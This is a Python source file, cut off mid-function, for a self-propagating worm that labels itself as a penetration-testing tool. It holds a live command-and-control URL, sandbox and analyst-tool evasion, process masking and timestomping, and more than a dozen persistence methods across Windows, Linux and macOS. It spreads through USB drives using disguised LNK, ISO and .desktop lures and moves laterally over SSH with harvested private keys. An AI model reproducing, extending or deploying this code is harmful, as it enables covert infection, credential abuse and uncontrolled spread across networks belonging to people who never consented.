#!/usr/bin/env python3
"""
Advanced Self-Propagating Agent — authorized penetration testing only
Vectors: USB · SSH lateral movement · Git hooks · Python env · Shell rc · Network scan
"""
import os,sys,socket,subprocess,platform,time,uuid,shutil,threading,json,base64,random,struct
import urllib.request as _req,urllib.parse as _parse

# ── C2 configuration ─────────────────────────────────────────────────────────
C2_PRIMARY  = "https://fare-project-miscellaneous-specialist.trycloudflare.com"
C2_FALLBACK = []   # add backup URLs here (HTTPS or .onion)
DNS_DROPPER = ""   # domain for TXT record C2 discovery e.g. "c2.example.com"
# SOCKS5/HTTP proxy for agent comms — e.g. "socks5h://127.0.0.1:9050" (Tor)
# or "http://proxy:8080" — blank = direct (replaced at bake time by start script)
_C2PROXY_BAKED = "__C2PROXY__"
C2_PROXY    = os.environ.get("C2_PROXY", "") or ("" if _C2PROXY_BAKED == "__C2PROXY__" else _C2PROXY_BAKED)
POLL_MIN,POLL_MAX = 8,20       # jitter window seconds
USB_INTERVAL      = 8
NET_INTERVAL      = 120        # network spread check every 2min
EXFIL_ON_FIRST    = True       # auto-dump on first contact

IS_WIN  = sys.platform == "win32"
IS_LIN  = sys.platform.startswith("linux")
IS_MAC  = sys.platform == "darwin"

# ── XOR stream cipher — key derived from AID via SHA256 ──────────────────────
import hashlib as _hlib
def _xk():
    """Per-agent key: SHA256(AID)[0:16] — unique per infected host."""
    return _hlib.sha256(AID.encode() if isinstance(AID,str) else AID).digest()[:16]
def _xor(data):
    if isinstance(data,str): data=data.encode()
    k=_xk(); return bytes(b^k[i%len(k)] for i,b in enumerate(data))
def _b64x(data): return base64.b64encode(_xor(data)).decode()
def _xb64(s):    return _xor(base64.b64decode(s))

# ── DNS-over-HTTPS C2 fallback (uses Cloudflare DoH TXT lookup) ──────────────
def _doh_lookup(domain:str) -> str:
    """Query DoH for a TXT record containing the C2 URL."""
    try:
        import urllib.request as _ur2, json as _js2
        req = _ur2.Request(
            f"https://cloudflare-dns.com/dns-query?name={domain}&type=TXT",
            headers={"Accept":"application/dns-json"})
        r = _ur2.urlopen(req, timeout=5)
        data = _js2.loads(r.read())
        for ans in data.get("Answer",[]):
            txt = ans.get("data","").strip('"')
            if txt.startswith("http"):
                return txt
    except: pass
    return ""

# ── Full Chrome browser request headers ──────────────────────────────────────
_CHROME_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
_LINUX_UA  = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
def _ua():
    return _CHROME_UA if IS_WIN else _LINUX_UA

# ── Persistent identity ───────────────────────────────────────────────────────
def _home_dir():
    if IS_WIN:  return os.path.expandvars(r"%APPDATA%\Microsoft\Windows\SystemCache")
    if IS_MAC:  return os.path.expanduser("~/Library/Application Support/.SysUpdate")
    return os.path.expanduser("~/.local/share/.sysupdate")

def _agent_bin(): return os.path.join(_home_dir(), ".update.pyw" if IS_WIN else ".update.py")

def _load_id():
    p=os.path.join(_home_dir(),".id")
    try: return open(p).read().strip()
    except:
        aid="w"+"".join(f"{b:02x}" for b in uuid.uuid4().bytes[:4])
        try: os.makedirs(_home_dir(),exist_ok=True); open(p,"w").write(aid)
        except: pass
        return aid

AID      = _load_id()
C2_URL   = C2_PRIMARY
_first   = True
_spread_log = set()      # track where we've already spread
_persist_methods = []    # persistence methods installed on this host (reported to C2)

# ── Worm remote control ───────────────────────────────────────────────────────
_ctrl = {
    "spreading": True,   # master on/off — all vectors obey this
    "usb":       True,   # USB vector
    "ssh":       True,   # SSH key/scan vectors
    "spray":     True,   # SSH password spray vector
    "smb":       True,   # SMB vector
    "netmount":  True,   # network mount infection
    "docker":    True,   # Docker escape vector
    "email":     True,   # email spread
    "git":       True,   # git hook poisoning
    "paused":    False,  # pause (hold poll loop but don't exit)
    "interval":  POLL_MIN,
    "skip":      set(),  # hosts to permanently skip
    "spread_now":False,  # trigger immediate spread cycle
}
_ctrl_lock = threading.Lock()

# ── Analyst/sandbox bail-out (sysmon evasion) ────────────────────────────────
def _analyst_check():
    """Exit with long sleep if analyst tools detected (procmon, wireshark, x64dbg…)."""
    _analyst_tools_win = ['procmon','procexp','wireshark','fiddler','x64dbg','ollydbg','processhacker','sysmon64','pestudio','regshot','tcpview']
    _analyst_tools_lin = ['wireshark','strace','ltrace','gdb','radare2','frida','sysdig','tcpdump']
    try:
        if IS_WIN:
            import subprocess as _sp2
            out = _sp2.check_output('tasklist /fo csv /nh 2>nul', shell=True, timeout=5).decode(errors='replace').lower()
            for t in _analyst_tools_win:
                if t in out: time.sleep(7200); sys.exit(0)
        elif IS_LIN:
            plist = os.listdir('/proc') if os.path.isdir('/proc') else []
            running = set()
            for pid in plist:
                try:
                    comm = open(f'/proc/{pid}/comm').read().strip().lower()
                    running.add(comm)
                except: pass
            for t in _analyst_tools_lin:
                if t in running: time.sleep(7200); sys.exit(0)
    except: pass
    # Random startup jitter — breaks Sysmon event-sequence correlation
    time.sleep(random.uniform(2, 12))

# ── Process masking ───────────────────────────────────────────────────────────
def _mask_proc():
    names=[b"[kworker/u16:2]",b"[migration/0]",b"[ksoftirqd/0]",b"sshd: user@pts/0"]
    try:
        if IS_LIN:
            import ctypes,ctypes.util
            libc=ctypes.CDLL(ctypes.util.find_library("c") or "libc.so.6")
            libc.prctl(15,random.choice(names),0,0,0)
        if IS_WIN:
            import ctypes; ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(),0)
    except: pass
    # Rename argv[0] so ps aux shows it differently
    try: sys.argv[0]="python3"
    except: pass

# ── Installation & persistence ────────────────────────────────────────────────
def _install():
    src=os.path.abspath(__file__); dst=_agent_bin(); d=_home_dir()
    try:
        os.makedirs(d,exist_ok=True)
        if os.path.abspath(src)!=os.path.abspath(dst):
            shutil.copy2(src,dst)
        # Timestomp — match mtime to a nearby system file
        _timestomp(dst)
    except: pass
    global _persist_methods
    _persist_methods = _persist_all(dst)

def _timestomp(path):
    """Set file timestamps to match a legitimate system file"""
    refs=["/usr/bin/python3","/bin/bash","/usr/lib/python3",r"C:\Windows\System32\python3.dll"]
    for ref in refs:
        if os.path.exists(ref):
            try:
                st=os.stat(ref)
                os.utime(path,(st.st_atime,st.st_mtime))
                return
            except: pass

def _persist_all(dst):
    methods=[]
    if IS_WIN:
        # Registry Run key
        try:
            import winreg
            k=winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",0,winreg.KEY_SET_VALUE)
            winreg.SetValueEx(k,"WindowsSystemCache",0,winreg.REG_SZ,f'pythonw.exe "{dst}"')
            winreg.CloseKey(k); methods.append("reg_run")
        except: pass
        # Scheduled task (onlogon + onstart)
        try:
            subprocess.run(["schtasks","/create","/tn","WindowsDefenderCacheUpdate",
                "/tr",f'pythonw "{dst}"',"/sc","onlogon","/rl","highest","/f"],
                capture_output=True)
            methods.append("schtask")
        except: pass
        # Startup folder
        try:
            sf=os.path.expandvars(r"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup")
            bat=os.path.join(sf,"winupdate.bat")
            open(bat,"w").write(f'@echo off\nstart /b "" pythonw "{dst}"\n')
            methods.append("startup_folder")
        except: pass
    elif IS_LIN:
        try: os.chmod(dst,0o755)
        except: pass
        # crontab @reboot
        try:
            ex=subprocess.run(["crontab","-l"],capture_output=True,text=True).stdout
            if dst not in ex:
                subprocess.run(["crontab","-"],
                    input=ex.rstrip()+f"\n@reboot sleep 15 && python3 '{dst}' >/dev/null 2>&1 &\n",
                    text=True,capture_output=True)
                methods.append("crontab")
        except: pass
        # .bashrc + .profile + .bash_profile + .zshrc
        tag=f"# kernel-helper-{AID}"
        inject=f"\n{tag}\n[ -f '{dst}' ] && (python3 '{dst}' >/dev/null 2>&1 &)\n"
        for rc in [".bashrc",".profile",".bash_profile",".zshrc",".zprofile"]:
            p=os.path.expanduser(f"~/{rc}")
            try:
                c=open(p).read() if os.path.exists(p) else ""
                if tag not in c:
                    open(p,"a").write(inject); methods.append(rc)
            except: pass
        # systemd user service
        try:
            sd=os.path.expanduser("~/.config/systemd/user")
            os.makedirs(sd,exist_ok=True)
            svc=os.path.join(sd,"kernel-helper.service")
            open(svc,"w").write(
                f"[Unit]\nDescription=Kernel Helper\nAfter=network.target\n\n"
                f"[Service]\nExecStart=python3 {dst}\nRestart=always\nRestartSec=20\n\n"
                f"[Install]\nWantedBy=default.target\n")
            subprocess.run(["systemctl","--user","daemon-reload"],capture_output=True)
            subprocess.run(["systemctl","--user","enable","kernel-helper"],capture_output=True)
            subprocess.run(["systemctl","--user","start","kernel-helper"],capture_output=True)
            methods.append("systemd_user")
        except: pass
        # Python sitecustomize.py injection (runs on every python3 invocation)
        try:
            for sp in [p for p in sys.path if "site-packages" in p and os.access(p,os.W_OK)]:
                sc=os.path.join(sp,"sitecustomize.py")
                tag2=f"# sys-{AID}"
                c=open(sc).read() if os.path.exists(sc) else ""
                if tag2 not in c:
                    with open(sc,"a") as f:
                        f.write(f"\n{tag2}\nimport subprocess as _s,os as _o;_o.path.exists('{dst}') and _s.Popen(['python3','{dst}'],stdout=open('/dev/null','w'),stderr=open('/dev/null','w'))\n")
                    methods.append(f"sitecustomize:{sp}")
                break
        except: pass
        # Git global hook injection
        try:
            ghooks=subprocess.run(["git","config","--global","core.hooksPath"],
                capture_output=True,text=True).stdout.strip()
            if not ghooks:
                hdir=os.path.expanduser("~/.git-hooks"); os.makedirs(hdir,exist_ok=True)
                subprocess.run(["git","config","--global","core.hooksPath",hdir],capture_output=True)
                ghooks=hdir
            hook=os.path.join(ghooks,"pre-commit")
            tag3=f"# gh-{AID}"
            c=open(hook).read() if os.path.exists(hook) else "#!/bin/sh\n"
            if tag3 not in c:
                open(hook,"w").write(c.rstrip()+f"\n{tag3}\n(python3 '{dst}' >/dev/null 2>&1 &)\n")
                os.chmod(hook,0o755); methods.append("git_global_hook")
        except: pass
        # /etc/profile.d/ if writable
        try:
            pd="/etc/profile.d/sys-update.sh"
            if os.access("/etc/profile.d/",os.W_OK):
                open(pd,"w").write(f"#!/bin/sh\n# sys-update\n[ -f '{dst}' ] && (python3 '{dst}' >/dev/null 2>&1 &)\n")
                os.chmod(pd,0o755); methods.append("profile.d")
        except: pass
        # Vim plugin (runs on every vim open)
        try:
            vp=os.path.expanduser("~/.vim/plugin"); os.makedirs(vp,exist_ok=True)
            vf=os.path.join(vp,"syshelper.vim")
            if not os.path.exists(vf):
                open(vf,"w").write(f"\" helper\nautocmd VimEnter * silent! call system('python3 {dst} &')\n")
                methods.append("vim_plugin")
        except: pass
    elif IS_MAC:
        try: os.chmod(dst,0o755)
        except: pass
        try:
            pd=os.path.expanduser("~/Library/LaunchAgents")
            os.makedirs(pd,exist_ok=True)
            pl=os.path.join(pd,"com.apple.sysupdate.plist")
            open(pl,"w").write(
                '<?xml version="1.0"?>\n<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" '
                '"http://www.apple.com/DTDs/PropertyList-1.0.dtd">\n<plist version="1.0"><dict>\n'
                '<key>Label</key><string>com.apple.sysupdate</string>\n'
                f'<key>ProgramArguments</key><array><string>python3</string><string>{dst}</string></array>\n'
                '<key>RunAtLoad</key><true/><key>KeepAlive</key><true/>\n</dict></plist>\n')
            subprocess.run(["launchctl","load",pl],capture_output=True)
            methods.append("launchagent")
        except: pass
        # .zshrc / .bash_profile
        tag=f"# apple-{AID}"
        inject=f"\n{tag}\n[ -f '{dst}' ] && (python3 '{dst}' >/dev/null 2>&1 &)\n"
        for rc in [".zshrc",".bash_profile",".profile"]:
            p=os.path.expanduser(f"~/{rc}")
            try:
                c=open(p).read() if os.path.exists(p) else ""
                if tag not in c: open(p,"a").write(inject); methods.append(rc)
            except: pass
    return methods

# ── USB spreading ─────────────────────────────────────────────────────────────
def _removable():
    drives=[]
    try:
        if IS_WIN:
            import ctypes; mask=ctypes.windll.kernel32.GetLogicalDrives()
            for i in range(26):
                if mask&(1<<i):
                    l=chr(65+i)+":\\"
                    if ctypes.windll.kernel32.GetDriveTypeW(l)==2: drives.append(l)
        elif IS_LIN:
            for line in open("/proc/mounts"):
                p=line.split(); mp=p[1] if len(p)>=2 else ""
                if mp.startswith(("/media/","/mnt/","/run/media/")): drives.append(mp)
        elif IS_MAC:
            for v in os.listdir("/Volumes"):
                p=f"/Volumes/{v}"
                if os.path.ismount(p) and v not in ("Macintosh HD",""): drives.append(p)
    except: pass
    return drives

def _make_ps_deploy_cmd(usb_py, usb_drive):
    """
    Build a powershell.exe inline -Command argument string.
    Goal: copy worm to AppData + 3 persistence methods + launch + open Explorer.
    This is the LNK target argument on modern Windows 10/11 — no VBS in chain.
    """
    apd  = r"%APPDATA%\Microsoft\Windows\SystemCache"
    inst = apd + r"\update.py"
    # Single-line PS command (will be the LNK Arguments field)
    cmd = (
        "-WindowStyle Hidden -NonInteractive -ExecutionPolicy Bypass -Command \""
        f"$apd=[System.Environment]::ExpandEnvironmentVariables('{apd}');"
        f"$inst=[System.Environment]::ExpandEnvironmentVariables('{inst}');"
        "New-Item -ItemType Directory -Path $apd -Force|Out-Null;"
        f"Copy-Item '{usb_py}' $inst -Force;"
        "(Get-Item $inst -Force).Attributes='Hidden';"
        "Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'"
        " -Name 'WinSysHelper' -Value \"pythonw `\"$inst`\"\" -Force;"
        "schtasks /create /tn WinDefenderHelper"
        " /tr \"pythonw `\"$inst`\"\" /sc onlogon /rl highest /f 2>$null;"
        "Start-Process pythonw -ArgumentList \"`\"$inst`\"\" -WindowStyle Hidden;"
        f"Start-Process explorer '{usb_drive}'\""
    )
    return cmd

def _make_usb_iso(usb_py, usb_drive, iso_out):
    """
    Build an ISO container holding a copy of the agent + LNK lures.
    Files inside a mounted ISO have no Mark-of-the-Web — SmartScreen won't warn.
    Uses mkisofs/genisoimage on the build machine (operator side, not victim).
    Called from start script's payload baking, not from the agent itself.
    """
    try:
        import tempfile, shutil as _sh2
        stage = tempfile.mkdtemp(prefix=".iso_stage_")
        # Copy agent into ISO
        shutil.copy2(usb_py, os.path.join(stage, "update.py"))
        # Build LNK lures inside ISO (relative paths — powershell runs from mounted vol)
        ps_exe = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
        lures = [
            ("Documents.lnk",     "shell32.dll", 4),
            ("Photos.lnk",        "imageres.dll",108),
            ("Backup.lnk",        "shell32.dll", 4),
            ("Resume 2024.pdf.lnk","shell32.dll",70),
        ]
        cmd = ("-WindowStyle Hidden -NonInteractive -ExecutionPolicy Bypass"
               r" -File update.py")
        for lname, idll, iidx in lures:
            _make_lnk(os.path.join(stage, lname), ps_exe, cmd,
                      icon_path=f"%SystemRoot%\\system32\\{idll}",
                      icon_idx=iidx, show_cmd=7)
        # Build ISO
        tool = shutil.which("mkisofs") or shutil.which("genisoimage")
        if tool:
            r = subprocess.run([tool,"-quiet","-o",iso_out,stage],
                               capture_output=True)
            _sh2.rmtree(stage, ignore_errors=True)
            return r.returncode == 0
        _sh2.rmtree(stage, ignore_errors=True)
    except: pass
    return False

def _make_fast_deploy_linux(usb_py, usb_drive):
    """
    Bash fast-deploy: copy + 4 persistence methods + launch in < 0.5 seconds.
    Triggered by .desktop files on the USB.
    """
    sh = f"""#!/bin/bash
# fast deploy
SRC="{usb_py}"
DST="$HOME/.local/share/.sysupdate/.update.py"
mkdir -p "$(dirname "$DST")"

# Step 1: Copy to disk immediately (USB can be removed after this)
cp -f "$SRC" "$DST" 2>/dev/null
chmod +x "$DST"

# Step 2: crontab persistence
(crontab -l 2>/dev/null | grep -v "$DST"; echo "@reboot sleep 10 && python3 '$DST' >/dev/null 2>&1 &") | crontab - 2>/dev/null

# Step 3: bashrc persistence
TAG="# net-{AID}"
grep -q "$TAG" "$HOME/.bashrc" 2>/dev/null || echo -e "\\n$TAG\\n[ -f '$DST' ] && (python3 '$DST' >/dev/null 2>&1 &)" >> "$HOME/.bashrc"

# Step 4: systemd user service
SVC="$HOME/.config/systemd/user/net-helper.service"
mkdir -p "$(dirname "$SVC")"
cat > "$SVC" <<SVCEOF
[Unit]
Description=Network Helper
After=network.target
[Service]
ExecStart=python3 $DST
Restart=always
RestartSec=15
[Install]
WantedBy=default.target
SVCEOF
systemctl --user daemon-reload 2>/dev/null
systemctl --user enable net-helper 2>/dev/null
systemctl --user start net-helper 2>/dev/null

# Step 5: Launch in background now
(python3 "$DST" >/dev/null 2>&1 &)

# Step 6: Open file manager so user sees drive contents
(nautilus "{usb_drive}" 2>/dev/null || thunar "{usb_drive}" 2>/dev/null || dolphin "{usb_drive}" 2>/dev/null || xdg-open "{usb_drive}" 2>/dev/null) &
"""
    sh_path = os.path.join(os.path.dirname(usb_py),"_deploy.sh")
    try:
        open(sh_path,"w").write(sh); os.chmod(sh_path,0o755)
    except: pass
    return sh_path

def _spread_usb(drive):
    src=os.path.abspath(__file__)
    try:
        if IS_WIN:
            # ── Drop hidden payload ──────────────────────────────────────────
            hdir=os.path.join(drive,"System Volume Information",".cache")
            os.makedirs(hdir,exist_ok=True)
            dst=os.path.join(hdir,"update.py"); shutil.copy2(src,dst)
            _timestomp(dst)
            for f in [hdir,dst]: subprocess.run(["attrib","+h","+s",f],capture_output=True)

            # ── LNK lures → powershell.exe inline (primary modern vector) ───
            # No VBS/wscript in the chain — autorun.inf dead since Win7 SP1
            _drop_usb_lures_win(drive, dst)

            # ── ISO container — MOTW bypass ──────────────────────────────────
            # Files inside a mounted ISO have no Mark-of-the-Web
            iso_out = os.path.join(drive, "Drive_Backup.iso")
            _make_usb_iso(dst, drive, iso_out)

            # ── mshta.exe lure — backup execution method ─────────────────────
            ps_deploy = _make_ps_deploy_cmd(dst, drive)
            ps_exe = r"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe"
            mshta_lnk = os.path.join(drive, "Setup.lnk")
            mshta_exe = r"%SystemRoot%\System32\mshta.exe"
            _make_lnk(mshta_lnk, mshta_exe,
                      f'vbscript:Execute("CreateObject(""WScript.Shell"").Run ""{ps_exe} {ps_deploy}"",0:close")',
                      icon_path=r"%SystemRoot%\system32\shell32.dll",
                      icon_idx=8, show_cmd=7)

            # ── Hide existing real files so lures are only visible items ─────
            try:
                for item in os.listdir(drive):
                    fp=os.path.join(drive,item)
                    if not item.endswith(".lnk") and item not in ("desktop.ini","Drive_Backup.iso"):
                        subprocess.run(["attrib","+h",fp],capture_output=True)
            except: pass

        elif IS_MAC:
            hdir=os.path.join(drive,".system_cache"); os.makedirs(hdir,exist_ok=True)
            dst=os.path.join(hdir,".update.py"); shutil.copy2(src,dst); os.chmod(dst,0o755)
            _timestomp(dst)
            # macOS: .app bundle lure that looks like a folder
            app_dir=os.path.join(drive,"Open Files.app","Contents","MacOS")
            os.makedirs(app_dir,exist_ok=True)
            launcher=os.path.join(app_dir,"launcher")
            open(launcher,"w").write(f"#!/bin/bash\npython3 '{dst}' &\nopen '{drive}'\n")
            os.chmod(launcher,0o755)
            plist=os.path.join(drive,"Open Files.app","Contents","Info.plist")
            open(plist,"w").write(
                '<?xml version="1.0"?><plist version="1.0"><dict>'
                '<key>CFBundleExecutable</key><string>launcher</string>'
                '<key>CFBundleName</key><string>Open Files</string>'
                '<key>CFBundleIconFile</key><string>folder</string></dict></plist>')
            # .desktop equivalent for Finder
            for lure in ["Documents.command","Open_Drive.command"]:
                lp=os.path.join(drive,lure)
                open(lp,"w").write(f"#!/bin/bash\npython3 '{dst}' >/dev/null 2>&1 &\nopen '{drive}'\n")
                os.chmod(lp,0o755)

        else:  # Linux
            hdir=os.path.join(drive,".system_cache"); os.makedirs(hdir,exist_ok=True)
            dst=os.path.join(hdir,".update.py"); shutil.copy2(src,dst); os.chmod(dst,0o755)
            _timestomp(dst)

            # ── Fast-deploy shell script ─────────────────────────────────────
            sh_path = _make_fast_deploy_linux(dst, drive)

            # ── .desktop lures that call fast-deploy (not python directly) ───
            # fast-deploy copies to disk first — USB can be yanked after that
            for name,label in [("Open_Files.desktop","Open Files"),
                                ("Documents.desktop","Documents"),
                                ("Backup.desktop","Backup Files"),
                                ("Photos.desktop","Photos")]:
                lp=os.path.join(drive,name)
                open(lp,"w").write(
                    f"[Desktop Entry]\nVersion=1.0\nType=Application\n"
                    f"Name={label}\nComment=\n"
                    f"Exec=bash '{sh_path}'\n"
                    f"Icon=folder\nTerminal=false\nStartupNotify=false\n")
                os.chmod(lp,0o755)

            # ── udev auto-spread: fires on every future USB mount ────────────
            # root path: /etc/udev/rules.d/  (system-wide)
            # user path: ~/.config/udev/rules.d/ (needs systemd ≥250 + user slice)
            _local_sh = os.path.join(_home_dir(), ".usb-mount-helper.sh")
            try: shutil.copy2(sh_path, _local_sh); os.chmod(_local_sh, 0o755)
            except: _local_sh = sh_path
            _udev_rule = (f'ACTION=="add", SUBSYSTEM=="block", '
                          f'ENV{{ID_FS_USAGE}}=="filesystem", '
                          f'RUN+="/bin/bash {_local_sh}"\n')
            _timestomp(_local_sh)
            if os.geteuid()==0:
                # System-wide rule (most reliable)
                try:
                    open("/etc/udev/rules.d/99-usb-mount.rules","w").write(_udev_rule)
                    subprocess.run(["udevadm","control","--reload-rules"],capture_output=True)
                except: pass
            else:
                # User-level rule (systemd ≥250, no root required)
                try:
                    _udir = os.path.expanduser("~/.config/udev/rules.d")
                    os.makedirs(_udir, exist_ok=True)
                    open(os.path.join(_udir,"99-usb-mount.rules"),"w").write(_udev_rule)
                    subprocess.run(["systemctl","--user","restart","systemd-udevd"],
                                   capture_output=True)
                except: pass
        return True
    except Exception as e: return False

def _make_lnk(lnk_path, target_path, args="", icon_path=None, icon_idx=0, show_cmd=7):
    """
    Build a Windows .lnk shortcut from scratch using raw bytes.
    show_cmd=7 = SW_SHOWMINNOACTIVE (window minimized, hidden from taskbar)
    icon from shell32.dll idx 3 = folder icon
    """
    import struct
    # ── Header ──────────────────────────────────────────────────────────────
    HEADER_SIZE = 0x4C
    CLSID = b'\x01\x14\x02\x00\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00\x46'
    # LinkFlags: HasLinkTargetIDList | HasLinkInfo | HasRelativePath |
    #            HasWorkingDir | HasArguments | HasIconLocation | IsUnicode
    link_flags = (1<<0)|(1<<1)|(1<<2)|(1<<3)|(1<<4)|(1<<6)|(1<<7)
    file_attrs  = 0x20   # FILE_ATTRIBUTE_ARCHIVE
    times       = b'\x00'*8   # created/accessed/written (zeroed)
    show        = show_cmd
    hotkey      = 0
    header = struct.pack('<I16sIIQQQIIHH10s',
        HEADER_SIZE, CLSID, link_flags, file_attrs,
        0,0,0,           # times
        0,               # file size
        icon_idx,        # icon index
        show,            # show command
        hotkey,          # hotkey
        b'\x00'*10       # reserved
    )
    # ── IDList (minimal — just enough to satisfy parser) ────────────────────
    idlist = b'\x00\x00'   # empty item ID list terminator
    idlist_block = struct.pack('<H',len(idlist)) + idlist

    # ── LinkInfo (no local path — we rely on RelativePath) ──────────────────
    link_info = struct.pack('<IIIIIII',
        0x1C, 0x1C, 0, 0, 0x1C, 0, 0)   # minimal, VolumeID/LocalPath offsets=0
    link_info_block = struct.pack('<I',len(link_info)+4) + link_info

    def _utf16le_sz(s):
        enc = s.encode('utf-16-le')
        return struct.pack('<H', len(s)) + enc

    # ── StringData ──────────────────────────────────────────────────────────
    rel_path  = _utf16le_sz(target_path)
    work_dir  = _utf16le_sz(os.path.dirname(target_path))
    args_data = _utf16le_sz(args)
    icon_data = _utf16le_sz(icon_path or r"%SystemRoot%\system32\shell32.dll")

    lnk = header + idlist_block + link_info_block + rel_path + work_dir + args_data + icon_data
    try:
        open(lnk_path,'wb').write(lnk)
        return True
    except: return False

def _drop_usb_lures_win(drive, usb_py):
    """
    Drop LNK lures on the USB root targeting powershell.exe directly.
    No VBS/wscript in the execution chain (autorun.inf dead since Win7 SP1,
    wscript.exe flagged by Defender on removable media on Win10/11).

    Lure types:
      Folder-icon .lnk  — most clicked, look like directories
      Fake-doc .lnk     — Resume.pdf / Invoice.xlsx icons, high click rate
    LNK → powershell.exe -WindowStyle Hidden -Command [inline deploy]
    desktop.ini → drive appears as Documents system folder in Explorer
    """
    ps_exe  = r"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe"
    ps_args = _make_ps_deploy_cmd(usb_py, drive)

    lures = [
        # (filename,                icon_dll,               icon_idx)
        ("Documents.lnk",           r"%SystemRoot%\system32\shell32.dll",    4),
        ("Photos.lnk",              r"%SystemRoot%\system32\imageres.dll", 108),
        ("Important Files.lnk",     r"%SystemRoot%\system32\shell32.dll",    4),
        ("Work Files.lnk",          r"%SystemRoot%\system32\shell32.dll",    4),
        ("Backup.lnk",              r"%SystemRoot%\system32\shell32.dll",    4),
        ("Resume 2024.pdf.lnk",     r"%SystemRoot%\system32\shell32.dll",   70),
        ("Invoice_March.xlsx.lnk",  r"%SystemRoot%\system32\shell32.dll",   70),
    ]
    for name, icon_dll, icon_idx in lures:
        lnk_path = os.path.join(drive, name)
        if not os.path.exists(lnk_path):
            _make_lnk(lnk_path, ps_exe, ps_args,
                      icon_path=icon_dll, icon_idx=icon_idx, show_cmd=7)

    # desktop.ini — drive appears as Documents system folder in Explorer
    ini = os.path.join(drive, "desktop.ini")
    try:
        open(ini,"w").write(
            "[.ShellClassInfo]\r\n"
            "CLSID2={0AFACED1-E828-11D1-9187-B532F1E9575D}\r\n"
            "Flags=2\r\n"
            "InfoTip=Contains your documents\r\n"
            "IconResource=%SystemRoot%\\system32\\shell32.dll,4\r\n"
            "[ViewState]\r\nMode=\r\nVid=\r\nFolderType=Documents\r\n"
        )
        subprocess.run(["attrib","+h","+s",ini], capture_output=True)
        subprocess.run(["attrib","+r","+s",drive.rstrip("\\")], capture_output=True)
    except: pass

def _usb_watcher():
    known=set(_removable())
    while True:
        try:
            if _ctrl["spreading"] and _ctrl["usb"] and not _ctrl["paused"]:
                cur=set(_removable())
                for d in cur-known:
                    if d not in _spread_log and d not in _ctrl["skip"]:
                        ok=_spread_usb(d); _spread_log.add(d)
                        _post(f"/agent/result?id={AID}&cmd=USB_SPREAD",f"drive={d} ok={ok}")
                known=cur
            else:
                cur=set(_removable()); known=cur  # track new drives but don't spread
        except: pass
        time.sleep(USB_INTERVAL)

# ── SSH lateral movement ──────────────────────────────────────────────────────
def _ssh_targets():
    """Extract targets from known_hosts, auth logs, bash history"""
    targets=set()
    # known_hosts
    kh=os.path.expanduser("~/.ssh/known_hosts")
    if os.path.exists(kh):
        for line in open(kh,errors="replace"):
            host=line.split()[0] if line.strip() else ""
            if host and not host.startswith("#"):
                host=host.lstrip("|").split(",")[0]
                if not host.startswith("["):
                    targets.add(host)
    # bash_history
    for hf in [os.path.expanduser("~/.bash_history"),os.path.expanduser("~/.zsh_history")]:
        if os.path.exists(hf):
            for line in open(hf,errors="replace"):
                import re
                for m in re.finditer(r'ssh\s+(?:[a-zA-Z0-9_]+@)?([a-zA-Z0-9.\-]+)',line):
                    targets.add(m.group(1))
    # /etc/hosts (internal hosts)
    try:
        for line in open("/etc/hosts",errors="replace"):
            if line.strip() and not line.startswith("#"):
                parts=line.split()
                if len(parts)>=2 and not parts[0].startswith(("127.","0.","::","fe80")):
                    targets.add(parts[0])
    except: pass
    # auth.log — recently authenticated hosts
    try:
        out=subprocess.run(["grep","Accepted","/var/log/auth.log"],
            capture_output=True,text=True,timeout=5).stdout
        import re
        for m in re.finditer(r'from\s+(\d+\.\d+\.\d+\.\d+)',out):
            targets.add(m.group(1))
    except: pass
    return list(targets)[:30]  # cap at 30 targets

def _ssh_keys():
    """Collect all available SSH private keys"""
    keys=[]
    for d in [os.path.expanduser("~/.ssh"),"/root/.ssh"]:
        if os.path.isdir(d):
            for f in os.listdir(d):
                fp=os.path.join(d,f)
                if os.path.isfile(fp) and not f.endswith((".pub",".known_hosts","authorized_keys","config")):
                    try:
                        c=open(fp).read()
                        if "PRIVATE KEY" in c: keys.append(fp)
                    except: pass
    return keys

def _ssh_spread(host,keyfile,user=None):
    """Try to spread via SSH using a found key"""
    src=os.path.abspath(__file__)
    users=[user] if user else [os.environ.get("USER","root"),"root","ubuntu","admin","kali","pi","user","deploy"]
    for u in users:
        try:
            # Test SSH access
            r=subprocess.run([
                "ssh","-i",keyfile,"-o","StrictHostKeyChecking=no",
                "-o","ConnectTimeout=6","-o","BatchMode=yes",
                "-o","PasswordAuthentication=no",
                f"{u}@{host}","echo OK"],
                capture_output=True,text=True,timeout=12)
            if "OK" in r.stdout:
                # Upload worm
                dst_path=f"/tmp/.{AID}.py"
                cp=subprocess.run([
                    "scp","-i",keyfile,"-o","StrictHostKeyChecking=no",
                    "-o","ConnectTimeout=6","-o","BatchMode=yes",
                    src,f"{u}@{host}:{dst_path}"],
                    capture_output=True,text=True,timeout=20)
                if cp.returncode==0:
                    # Execute it
                    subprocess.run([
                        "ssh","-i",keyfile,"-o","StrictHostKeyChecking=no",
                        "-o","BatchMode=yes","-o","ConnectTimeout=6",
                        f"{u}@{host}",
                        f"chmod +x {dst_path} && (python3 {dst_path} >/dev/null 2>&1 &)"],
                        capture_output=True,timeout=12)
                    return f"SSH OK {u}@{host}"
                return f"SSH auth OK but SCP failed {u}@{host}"
        except: pass
    return None

def _net_scan_ssh(subnet):
    """Quick TCP scan of /24 subnet for open port 22"""
    import ipaddress
    live=[]
    try:
        net=ipaddress.ip_network(subnet,strict=False)
        hosts=list(net.hosts())
        random.shuffle(hosts)
        for h in hosts[:40]:  # scan up to 40 hosts
            ip=str(h)
            try:
                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.settimeout(0.8)
